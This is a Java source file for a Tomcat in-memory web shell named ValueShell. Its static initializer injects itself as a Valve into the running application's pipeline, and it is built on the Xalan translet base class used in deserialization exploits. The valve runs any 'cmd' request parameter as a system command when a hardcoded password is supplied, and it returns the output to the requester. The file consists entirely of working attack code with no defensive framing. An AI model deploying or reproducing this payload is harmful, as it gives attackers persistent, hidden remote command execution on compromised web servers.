import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletException;
import java.io.IOException;

public class ValueShell extends AbstractTranslet implements Valve {
    static {
        StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();
        context.getPipeline().addValve(new ValueShell());
    }

    @Override
    public Valve getNext() {
        return null;
    }

    @Override
    public void setNext(Valve valve) {

    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
//        HttpServletResponse response = (HttpServletResponse) servletResponse;
//        HttpServletRequest request = (HttpServletRequest) servletRequest;

        request.setCharacterEncoding("UTF-8");
        String password = request.getParameter("password");

        if (password != null) {
            if (password.equals("1nhann")) {
                String cmd = request.getParameter("cmd");
                Runtime rt = Runtime.getRuntime();
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = null;
                StringBuilder sb = new StringBuilder();
                while ((s = stdInput.readLine()) != null) {
                    sb.append(s);
                    sb.append("\n");
                }
                response.getWriter().write(sb.toString());
                return;
            }
        }
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
